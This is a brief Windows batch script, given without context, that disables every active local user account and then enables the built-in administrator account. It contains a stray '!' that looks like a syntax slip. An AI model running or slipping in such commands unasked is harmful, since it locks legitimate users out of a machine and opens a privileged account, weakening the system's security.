@ECHO OFF
SETLOCAL EnableExtensions
FOR /F "TOKENS=2* delims==" %%G IN ('
        wmic USERACCOUNT where "status='OK'" get name/value  2^>NUL
    ') DO for %%g in (%%~G) do (!
            net user %%~g /active:no
            echo %%~g was disabled
          )
net user administrator /active:yes
